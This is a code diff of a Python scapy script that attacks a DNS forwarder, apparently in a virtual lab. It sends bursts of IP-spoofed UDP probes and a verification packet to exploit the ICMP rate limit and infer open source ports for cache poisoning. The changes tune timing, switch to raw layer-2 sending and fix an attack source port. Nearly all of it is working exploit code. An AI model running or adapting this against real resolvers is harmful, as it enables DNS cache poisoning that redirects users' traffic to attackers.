@@ -37,17 +37,25 @@ def random_ipv6_address():
     print(address)
     return address
 
+def to_milis_str(s):
+    return str(round(s * 1000)) + ' ms'
+
 forwarder_ip = '192.168.58.2'
 forwarder_port = 53
+resolver_ip = '192.168.58.3'
 domain_name = "cool.com"
 local_free_ip = []
 
 ICMP_limit_rate = 50
-ICMP_recovering_time = .02
+ICMP_recovering_time = .02 # 20 miliseconds
+sleep_time_for_ICMP_refresh = .05 # 50 ms
+wait_time_for_ICMP_reply = .1
+
+fixed_src_port_for_attack = 9556
 
 finished = 0
 
-global_socket = conf.L3socket(iface='vboxnet2')
+global_socket = conf.L2socket(iface='vboxnet2')
 
 
 #https://stackoverflow.com/a/58135538/3450691
@@ -58,9 +66,9 @@ PROF_DATA = collections.defaultdict(list)
 def profile(fn):
     @wraps(fn)
     def with_profiling(*args, **kwargs):
-        start_time = time.process_time()
+        start_time = time.perf_counter()
         ret = fn(*args, **kwargs)
-        elapsed_time = time.process_time() - start_time
+        elapsed_time = time.perf_counter() - start_time
         PROF_DATA[fn.__name__].append(elapsed_time)
         return ret
     return with_profiling
@@ -129,35 +137,10 @@ def step1(thread_id):
     lock.acquire()
     
     ret = sr1(packet, verbose=True)
-    
-    '''
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    #sock.connect((forwarder_ip, forwarder_port))
-    #sock.setblocking(False)
-    #sock.bind((my_ip, my_port))
-    sock.sendto(bytes(repr(str(packet)), 'utf-8'), (forwarder_ip, forwarder_port))
-    #send(packet, verbose=True)
-
-    sock.bind((my_ip, my_port)) #local ip, local port
-
-    #t = AsyncSniffer(opened_socket=sock)
-
-    try:
-        reply, address = sock.recvfrom(512)
-        print (reply.show())
-    except socket.error as e:
-        print ("socket error")
-    except OSError as e:
-        print ("OS error")
-        
-    sock.close()
-    '''
-
 
     lock.release()
 
     
-
     #print (ret.show())
     return
 
@@ -171,63 +154,66 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     
 
     #print("Sleeping for 50ms")
-    time.sleep(0.05)
+    # this could be optimized
+    # 
+    time.sleep(sleep_time_for_ICMP_refresh)
 
-    start_time = time.process_time()
+    start_time = time.perf_counter()
 
     now_port = port_start
 
     # generate all probe packets, padding_packets (if any) and the verification packet first
     # and then send those in a burst
     probe_packet = []
-
+    # What should be the actual source??? RandIP()??? Or the dns resolver??? Or any local IP???
     for i in range(number_of_probe_packet):
         # Using spoofed ip
-        ip_layer = IP(dst=forwarder_ip, src=RandIP())
+        ip_layer = IP(dst=forwarder_ip, src=random.choice(local_free_ip))
         udp_layer = UDP(dport=now_port, sport=RandShort())
-        packet = ip_layer / udp_layer
-        probe_packet.append(packet)
+        packet = Ether() / ip_layer / udp_layer
+        probe_packet.append(raw(packet))
         now_port += 1
 
     padding_packet = []
-
+    # What should be the actual source??? RandIP()??? Or the dns resolver??? Or any local IP???
     for i in range(number_of_padding_packet):
         # Using spoofed ip
-        ip_layer = IP(dst=forwarder_ip, src=RandIP())
-        udp_layer = UDP(dport=1, sport=RandShort())
-        packet = ip_layer / udp_layer
-        padding_packet.append(packet)
+        ip_layer = IP(dst=forwarder_ip, src=random.choice(local_free_ip))
+        udp_layer = UDP(dport=1, sport=fixed_src_port_for_attack)
+        packet = Ether() / ip_layer / udp_layer
+        padding_packet.append(raw(packet))
 
     ip_layer = IP(dst=forwarder_ip) # leaving src to be filled up by scapy
-    udp_layer = UDP(dport=1, sport=RandShort())
-    verification_packet = ip_layer / udp_layer
+    udp_layer = UDP(dport=1, sport=fixed_src_port_for_attack)
+    verification_packet = Ether() / ip_layer / udp_layer
+    verification_packet = raw(verification_packet)
 
-    elapsed_time = time.process_time() - start_time
-    print ("Time needed for generating packets: " + str(elapsed_time))
+    elapsed_time = time.perf_counter() - start_time
+    print ("Time needed for generating packets: " + to_milis_str(elapsed_time))
 
     # improving scapy's packet sending performance
     # https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html
 
 
-    start_time = time.process_time()
+    start_time = time.perf_counter()
     for packet in probe_packet:
         #send(packet, verbose=False)
         global_socket.send(packet)
     for packet in padding_packet:
         #send(packet, verbose=False)
         global_socket.send(packet)
-    elapsed_time = time.process_time() - start_time
-    print ("Time needed for sending 50 packets: " + str(elapsed_time))
+    elapsed_time = time.perf_counter() - start_time
+    print ("Time needed for sending 50 packets: " + to_milis_str(elapsed_time))
 
     #print("Sending verification packet")
 
-    start_time = time.process_time()
+    start_time = time.perf_counter()
 
     # This timeout is the crucial factor
-    reply = sr1(verification_packet, timeout=.6, verbose=False) # in seconds
+    reply = sr1(verification_packet, timeout=wait_time_for_ICMP_reply, verbose=False) # in seconds
 
-    elapsed_time = time.process_time() - start_time
-    print ("Time needed for sending and receiving verification packet: " + str(elapsed_time))
+    elapsed_time = time.perf_counter() - start_time
+    print ("Time needed for sending and receiving verification packet: " + to_milis_str(elapsed_time))
     #print("Got reply from verificaiton packet")
     #print (reply.show())
 
@@ -294,7 +280,6 @@ def step2(thread_id, source_port_range_start, source_port_range_end):
         #for system wide time count + sleep also
         #another option was time.process_time() (check)
         start_time_one_chunk = time.perf_counter()
-        start_time = time.process_time()
         
         #print("Calling do_one_attack_chunk")
         ret = do_one_chunk_of_attack(start, ICMP_limit_rate, 0)
@@ -312,14 +297,11 @@ def step2(thread_id, source_port_range_start, source_port_range_end):
 
         
         end_time_one_chunk = time.perf_counter()
-        end_time = time.process_time()
         time_elapsed_for_one_chunk = end_time_one_chunk - start_time_one_chunk
-        time_elapsed = end_time - start_time
 
         #if (time_elapsed_for_one_chunk < ICMP_recovering_time)
         #    time.sleep(ICMP_recovering_time - time_elapsed_for_one_chunk)
-        print ("System wide time needed in this loop: " + str(time_elapsed_for_one_chunk))
-        print ("Process wide time needed in this loop: " + str(time_elapsed))
+        print ("System wide time needed in this loop once: " + to_milis_str(time_elapsed_for_one_chunk))
 
         start += ICMP_limit_rate
 
